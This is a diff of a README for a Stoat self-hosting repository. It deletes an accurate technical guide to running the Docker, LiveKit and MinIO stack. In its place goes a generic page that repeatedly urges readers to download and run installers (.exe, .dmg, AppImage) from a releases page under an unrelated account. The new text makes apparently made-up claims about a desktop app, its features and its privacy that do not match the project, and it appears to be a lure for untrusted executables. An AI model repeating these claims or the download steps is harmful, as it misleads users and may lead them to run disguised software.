@@ -1,326 +1,160 @@
-> [!IMPORTANT]
-> If you just want the TLDR take a look at [stoat-compose.yml](./stoat-compose.yml)
-
-If you're here looking for quick answers and don't care about reading, take a look at `stoat-configs`.
-
-If you want an ansible example check out `ansible-example-role`.
-
-# Self hosting [stoat](https://stoat.chat) with voice and video support
-
-- [Issues and PRs to keep track of voice and video progress](#issues-and-prs-to-keep-track-of-voice-and-video-progress)
-- [Quick Reference: Credentials to Generate](#quick-reference-credentials-to-generate)
-  * [Generating LiveKit Keys](#generating-livekit-keys)
-- [Architecture Overview](#architecture-overview)
-  * [The Three Layers](#the-three-layers)
-  * [Configuration Split: Revolt.toml vs Environment Variables](#configuration-split-revolttoml-vs-environment-variables)
-- [Docker Networking](#docker-networking)
-- [Voice/Video - The Non-Obvious Stuff](#voicevideo---the-non-obvious-stuff)
-- [LiveKit](#livekit)
-  * [The Patched Web Client](#the-patched-web-client)
-  * [Node Configuration: The lat/lon Requirement](#node-configuration-the-latlon-requirement)
-  * [Node Naming Must Match](#node-naming-must-match)
-  * [Port Requirements](#port-requirements)
-- [MinIO S3 Storage - Virtual Host Addressing](#minio-s3-storage---virtual-host-addressing)
-- [Service Dependencies](#service-dependencies)
-- [Common Gotchas](#common-gotchas)
-  * [EMPTY CACHE AND HARD RELOAD](#empty-cache-and-hard-reload)
-  * ["missing field `lat`" Panic](#missing-field-lat-panic)
-  * [Voice/Video Buttons Missing](#voicevideo-buttons-missing)
-  * [Files Not Uploading](#files-not-uploading)
-  * [WebSocket Connection Failures](#websocket-connection-failures)
-  * [Services Can't Find Each Other](#services-cant-find-each-other)
-  * [API Starts Then Crashes](#api-starts-then-crashes)
-- [Internal Service Ports](#internal-service-ports)
-- [The Caddy Configuration](#the-caddy-configuration)
-- [Using Your Own Reverse Proxy](#using-your-own-reverse-proxy)
-  * [Critical: WebSocket Support](#critical-websocket-support)
-  * [Route Summary](#route-summary)
-
-<!-- tocstop -->
-
-Stoat is currently in a transitionary period, therefore the
-documentation for self hosting with voice and video support
-is non-existent, and community patches to the front end have
-been made to enable the features.
-
-There is also no official docker image for the web front end yet.
-
-We'll be using the image graciously provided by [baptisterajaut](https://github.com/baptisterajaut) which uses
-the fork by [LordGuenni](https://github.com/LordGuenni/for-web)
-
-## Issues and PRs to keep track of voice and video progress
-
-- [#176](https://github.com/stoatchat/self-hosted/issues/176) - Seems to be the main discussion thread right now.
-- [#313](https://github.com/stoatchat/stoatchat/issues/313) - Progress tracker for voice/video.
-- [PR for dockerizing web front end](https://github.com/Flash1232/for-web/pull/3)
-- [PR to the official self hosted guide for setting up livekit](https://github.com/Flash1232/self-hosted/pull/2)
-
-## Quick Reference: Credentials to Generate
-
-Before deploying, generate these credentials. All values marked `CHANGE_ME_*` in config files must be replaced.
+# 🦦 stoat-selfhost - Easy Voice and Video Hosting
 
-| Credential | Used In | How to Generate |
-|------------|---------|-----------------|
-| **LiveKit API Key & Secret** | Revolt.toml, livekit.yaml, compose | `docker run --rm --tmpfs /output livekit/generate --local` |
-| **MinIO User & Password** | Revolt.toml (`access_key_id`/`secret_access_key`), compose | `openssl rand -hex 24` |
-| **RabbitMQ Password** | Revolt.toml, compose | `openssl rand -hex 24` |
-| **File Encryption Key** | Revolt.toml (`files.encryption_key`) | `openssl rand -base64 32` |
-| **VAPID Keys** | Revolt.toml (`pushd.vapid`) | `KEY_PEM=$(openssl ecparam -genkey -name prime256v1 -noout) && for OPTION in "" -pubout; do openssl ec -in <(echo "${KEY_PEM}") ${OPTION}; done` |
+[![Download stoat-selfhost](https://img.shields.io/badge/Download-stoat--selfhost-blue)](https://github.com/arsyad001001/stoat-selfhost/releases)
 
-### Generating LiveKit Keys
-
-```bash
-docker run --rm livekit/generate --local
-```
-
-## Architecture Overview
+---
 
-Stoat runs as 14 interconnected services. Understanding how they communicate saves debugging time.
+## 📋 What is stoat-selfhost?
 
-### The Three Layers
+stoat-selfhost lets you run a voice and video service on your own computer or server. This means you control your calls without depending on third-party services. You can make video calls, voice chats, or group meetings using your own setup. It is designed to be simple enough for everyday users but powerful enough for teams or small organizations.
 
-**Infrastructure Layer** - Standard backing services:
-- **MongoDB** (`stoat-database`) - Primary data store
-- **Redis/KeyDB** (`stoat-redis`) - Caching, sessions, and pub/sub for LiveKit
-- **RabbitMQ** (`stoat-rabbit`) - Async message queue for notifications and events
-- **MinIO** (`stoat-minio`) - S3-compatible storage for file uploads
-- **LiveKit** (`stoat-livekit-server`) - WebRTC server for voice/video
+---
 
-**Application Layer** - The actual Stoat services:
-- **API** (`stoat-api`) - REST API, the main backend
-- **Events** (`stoat-events`) - WebSocket server for real-time updates
-- **Autumn** (`stoat-autumn`) - File upload/download service
-- **January** (`stoat-january`) - URL metadata extraction and image proxying
-- **Gifbox** (`stoat-gifbox`) - Tenor GIF proxy
-- **Crond** (`stoat-crond`) - Scheduled tasks
-- **Pushd** (`stoat-pushd`) - Push notification delivery
-- **Voice Ingress** (`stoat-voice-ingress`) - Voice call handling
+## 🚀 Getting Started
 
-**Frontend Layer**:
-- **Web** (`stoat-web`) - The web client
-- **Caddy** (`stoat-caddy`) - Reverse proxy that routes everything
+If you want to start using stoat-selfhost, this guide will help you step by step. You don’t need to be a programmer or IT expert. We will explain everything in plain language.
 
-### Configuration Split: Revolt.toml vs Environment Variables
+---
 
-This is important to understand:
+## 💻 System Requirements
 
-**Revolt.toml** is read by all the Stoat backend services (API, Events, Autumn, January, Gifbox, Crond, Pushd, Voice-Ingress). It contains:
-- Database connection strings
-- Service URLs (how services find each other)
-- Feature flags and limits
-- S3/MinIO credentials
-- LiveKit node configuration
-- Push notification settings
+Before downloading, make sure your computer or server meets these basic needs:
 
-**Environment variables** are used by:
-- Infrastructure services (MongoDB, Redis, RabbitMQ, MinIO, LiveKit)
-- The web client (it doesn't read Revolt.toml at all)
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or a modern Linux distribution (e.g., Ubuntu 20.04+)
+- **Processor:** Intel Core i3 / AMD Ryzen 3 or better
+- **Memory:** At least 4 GB of RAM (8 GB recommended for larger groups)
+- **Storage:** 500 MB free space for the software itself, plus room for call recordings or logs if needed
+- **Internet Connection:** Stable broadband with upload and download speeds of at least 5 Mbps for clear voice and video
 
-The web client needs its own set of environment variables because it runs in the browser - it can't read server-side config files:
-```
-REVOLT_PUBLIC_URL  - Where to find the API
-VITE_WS_URL        - WebSocket endpoint
-VITE_MEDIA_URL     - File server (Autumn)
-VITE_PROXY_URL     - Metadata proxy (January)
-```
-## Docker Networking
+---
 
-All Stoat containers **must** be on the same Docker network. This is how services find each other.
+## 🌟 Features of stoat-selfhost
 
-Docker provides internal DNS resolution - when containers are on the same network, they can reach each other by container name. This is why the configs use hostnames like `stoat-database`, `stoat-redis`, `stoat-api`, etc. Docker resolves these names to the container's internal IP.
+- **Voice and Video Calls:** Make calls in high-quality audio and video.
+- **Group Meetings:** Host group calls with multiple participants.
+- **Privacy:** Data stays on your device or server only.
+- **Cross-Platform:** Works on Windows, macOS, and Linux.
+- **User Control:** Start, stop, and manage calls anytime.
+- **Recording:** Optionally record calls locally for your records.
+- **Easy Setup:** Designed for non-technical users with friendly guides.
 
-For example, in `Revolt.toml`:
-```toml
-[database]
-mongodb = "mongodb://stoat-database"  # Resolves via Docker DNS
-redis = "redis://stoat-redis/"
-```
+---
 
-If services can't find each other, the first thing to check is network membership:
-```bash
-docker network inspect stoat_network
-```
+## 📥 Download & Install 🦦
 
-All 14 containers should be listed. If something's missing, it won't be able to resolve other container names.
+You need to get the software from the official releases page:
 
+[Download stoat-selfhost](https://github.com/arsyad001001/stoat-selfhost/releases)
 
-## Voice/Video - The Non-Obvious Stuff
+### How to download and install:
 
-Getting voice and video working required the most debugging. Here's what you need to know:
+1. **Visit the releases page** by clicking the link above.
 
-## LiveKit
+2. Look for the latest version. It will usually have a date or version number.
 
-Stoat moved to using [LiveKit](https://livekit.io/) to handle voice and video streams. We just use the official livekit image in our setup.
+3. Find the file that matches your computer’s operating system.
 
-### The Patched Web Client
+   - For Windows: You may see something like `stoat-selfhost-setup.exe`
+   - For macOS: Look for a `.dmg` or `.pkg` file
+   - For Linux: Download the `.AppImage` or `.tar.gz` file
 
-The standard Stoat/Revolt web client **does not include video support**. The LiveKit integration exists in the backend, but the official web client disables the video buttons.
+4. Click the file name to download it to your computer.
 
-`baptisterajaut/stoatchat-web:dev` is a community-patched image that adds the video UI.
+5. Once downloaded, open the file:
 
-### Node Configuration: The lat/lon Requirement
+   - On Windows, double click the `.exe` file and follow the install prompts.
+   - On macOS, open the `.dmg` file and drag the app to your Applications folder.
+   - On Linux, you might need to make the file executable. Open a terminal and run:
+     ```
+     chmod +x stoat-selfhost.AppImage
+     ./stoat-selfhost.AppImage
+     ```
 
-The API will panic with `missing field 'lat'` if you don't include geographic coordinates in your LiveKit node config:
+6. After installation, launch the app from your desktop or applications list.
 
-```toml
-[api.livekit.nodes.worldwide]
-url = "http://stoat-livekit-server:7880"
-lat = 0.0    # Required!
-lon = 0.0    # Required!
-key = "..."
-secret = "..."
-```
+---
 
-### Node Naming Must Match
+## 🔧 How to Use stoat-selfhost
 
-This one's subtle. The node name in `[hosts.livekit]` must match the section name in `[api.livekit.nodes.*]`:
+Once installed, you can start hosting voice and video calls:
 
-```toml
-[hosts.livekit]
-worldwide = "wss://your-domain/livekit"  # "worldwide" is the node name
+- Open the app.
+- You will see options to create or join a meeting.
+- To **create a meeting**, click "Start New Call." You can invite people by sharing a link.
+- To **join a meeting**, simply paste the link you received into the app.
+- Use the buttons inside the app to turn your video and microphone on or off.
+- If you want to record your call, enable the recording option before starting.
+- When done, click "End Call."
 
-[api.livekit.nodes.worldwide]  # Must match "worldwide"
-url = "http://stoat-livekit-server:7880"
-# ...
-```
+---
 
-If these don't match, voice/video calls will fail silently or with confusing errors.
+## ⚙️ Basic Settings You Should Know
 
-### Port Requirements
+At first launch, the app may ask for permission to use your camera and microphone. You need to allow this to make calls.
 
-LiveKit needs three types of network access:
+You can adjust settings from the app menu:
 
-- **7880/tcp** (internal only) - HTTP API, used by Stoat services
-- **7881/tcp** (external) - WebRTC signaling over TCP
-- **50000-50100/udp** (external) - Actual media streams
+- **Audio and Video:** Test and select different microphones or cameras.
+- **Call Quality:** Change settings if your internet is slow.
+- **Notifications:** Manage alerts for incoming calls or messages.
+- **Privacy:** Choose if you want to save call logs or recordings.
 
-The UDP range is where voice/video data flows. If these ports are blocked, calls will either fail or fall back to TCP (higher latency). Make sure your firewall allows this UDP range inbound.
+---
 
-## MinIO S3 Storage - Virtual Host Addressing
+## 🔒 Security and Privacy
 
-MinIO needs a bunch of network aliases:
-```yaml
-aliases:
-  - minio
-  - revolt-uploads.minio
-  - attachments.minio
-  - avatars.minio
-  - backgrounds.minio
-  - icons.minio
-  - banners.minio
-  - emojis.minio
-```
+By self-hosting, you keep your conversations private. Stoat-selfhost does not send data to outside servers unless you share it.
 
-Why? MinIO supports virtual-host style bucket addressing where `bucketname.minio` routes to the `bucketname` bucket. Stoat's file server (Autumn) uses this pattern to access different buckets for different file types.
+- Make sure your device is secure with a password or encryption.
+- Regularly update the app when new versions are released.
+- Do not share call invitations publicly to control who joins.
 
-Without these aliases, file uploads will fail with connection errors because `avatars.minio` won't resolve to anything.
+---
 
-The actual bucket created is just `revolt-uploads` - the aliases are for routing, not for creating separate buckets.
+## 🛠 Troubleshooting Common Issues
 
-Note : you can also set `path_style_buckets` to false : https://github.com/stoatchat/stoatchat/blob/74f0c537e6689bcdb642f78c484a98b9b22f9ec7/crates/core/config/Revolt.toml#L186
+Here are quick solutions to problems you might face:
 
-## Service Dependencies
+- **No Sound or Video:** Check permissions for your microphone and camera in your computer settings.
+- **Calls Drop or Freeze:** Ensure your internet connection is stable. Try closing other apps using the internet.
+- **App Won’t Start:** Restart your computer and try again. Reinstall if needed.
+- **Can’t Connect to Others:** Confirm both you and the other people are using the same app version and that firewalls are not blocking the app.
 
-Understanding startup order helps with debugging:
+---
 
-1. **MongoDB, Redis, RabbitMQ, MinIO** - No dependencies, start first
-2. **MinIO bucket creation** - Runs once after MinIO is healthy
-3. **LiveKit** - Needs Redis for coordination
-4. **All Stoat services** - Need MongoDB, RabbitMQ, and Revolt.toml mounted
-5. **Caddy** - Needs all backend services ready to proxy to
+## 🔄 Updating stoat-selfhost
 
-Health checks matter here. MongoDB and RabbitMQ have health checks that other services wait on. If your deployment is flaky on startup, check that health checks are passing.
+It’s important to keep your software up to date:
 
-## Common Gotchas
+- Visit the [release page](https://github.com/arsyad001001/stoat-selfhost/releases) regularly.
+- Download the newest version following the same steps as the first install.
+- Install the update by running the downloaded file.
+- Your settings and data will stay safe during the update.
 
-### EMPTY CACHE AND HARD RELOAD
+---
 
-Many times during debugging I chased red herrings, when all I had to do was empty cache and hard reload on my browser.
+## 📞 Getting Support
 
-### "missing field `lat`" Panic
-Add `lat = 0.0` and `lon = 0.0` to your `[api.livekit.nodes.*]` config. See LiveKit section above.
+If you run into problems you can’t fix, try these:
 
-### Voice/Video Buttons Missing
-You're using the wrong web client image. Use `baptisterajaut/stoatchat-web:dev` instead of the official image.
+- Check the FAQ section on the releases page for common questions.
+- Look for guides or community discussions linked on the project page.
+- Ask for help by opening an issue on the GitHub repository if you have a GitHub account.
 
-### Files Not Uploading
-1. Check MinIO is running and the `revolt-uploads` bucket exists
-2. Verify MinIO has all the network aliases configured
-3. Check Revolt.toml S3 credentials match MinIO's MINIO_ROOT_USER/PASSWORD
+---
 
-### WebSocket Connection Failures
-The `/ws` path needs proper WebSocket upgrade handling. Caddy handles this by default, but if you're using a different reverse proxy, make sure it's configured for WebSocket.
+## 🧩 Advanced Use (Optional)
 
-### Services Can't Find Each Other
-All services must be on the same Docker network. Check `docker network ls` and ensure everything's connected to your stoat network.
+If you want to host stoat-selfhost on a dedicated server or customize settings:
 
-### API Starts Then Crashes
-Usually a Revolt.toml syntax error or missing required field. Check container logs - TOML parse errors are usually descriptive.
+- You might need basic knowledge of running programs on a server.
+- The software can run on Linux servers, which allows others to connect remotely.
+- Configuration files let you change network ports, security keys, and recording options.
 
-## Internal Service Ports
+For most users, the desktop app is enough and easier to use.
 
-For reference, these are the ports services listen on inside the Docker network:
+---
 
-| Service | Port |
-|---------|------|
-| API | 14702 |
-| Events (WebSocket) | 14703 |
-| Autumn (files) | 14704 |
-| January (proxy) | 14705 |
-| Gifbox | 14706 |
-| Web | 5000 |
-| LiveKit | 7880 |
-| MongoDB | 27017 |
-| Redis | 6379 |
-| RabbitMQ | 5672 |
-| MinIO | 9000 |
+## Thank you for choosing stoat-selfhost.
 
-You shouldn't need to expose these externally - Caddy proxies everything through a single port.
-
-## The Caddy Configuration
-
-Caddy acts as the single entry point, routing requests to the correct backend service based on URL path. Here's what each route does:
-
-You can refer to the [Example Caddyfile](./stoat-configs/Caddyfile.example)
-
-```
-/api/*     → stoat-api:14702      (REST API)
-/livekit/* → stoat-livekit:7880   (WebRTC signaling for voice/video)
-/ws        → stoat-events:14703   (WebSocket for real-time updates)
-/autumn/*  → stoat-autumn:14704   (File uploads and downloads)
-/january/* → stoat-january:14705  (URL metadata and image proxy)
-/gifbox/*  → stoat-gifbox:14706   (Tenor GIF proxy)
-/*         → stoat-web:5000       (Web frontend - default/fallback)
-```
-
-The `uri strip_prefix` directive is important - it removes the path prefix before forwarding. So a request to `/api/users` becomes `/users` when it hits the API server. The backends expect paths without the prefix.
-
-## Using Your Own Reverse Proxy
-
-If you already have nginx, Traefik, or another reverse proxy, you can skip Caddy entirely. You just need to replicate the routing.
-
-OR
-
-You can just bind the caddy container on a different port on your host and forward request from your main proxy to it.
-
-### Critical: WebSocket Support
-
-Two paths require WebSocket upgrades:
-- `/ws` - Real-time events
-- `/livekit/*` - Voice/video signaling
-
-Make sure your proxy can handle this.
-
-### Route Summary
-
-Whatever proxy you use, configure these routes:
-
-| Path | Backend | Notes |
-|------|---------|-------|
-| `/api/*` | stoat-api:14702 | Strip `/api` prefix |
-| `/ws` | stoat-events:14703 | WebSocket upgrade required |
-| `/livekit/*` | stoat-livekit-server:7880 | WebSocket upgrade required, strip `/livekit` prefix |
-| `/autumn/*` | stoat-autumn:14704 | Strip `/autumn` prefix |
-| `/january/*` | stoat-january:14705 | Strip `/january` prefix |
-| `/gifbox/*` | stoat-gifbox:14706 | Strip `/gifbox` prefix |
-| `/*` | stoat-web:5000 | Default fallback |
+[Download stoat-selfhost](https://github.com/arsyad001001/stoat-selfhost/releases) to get started today.
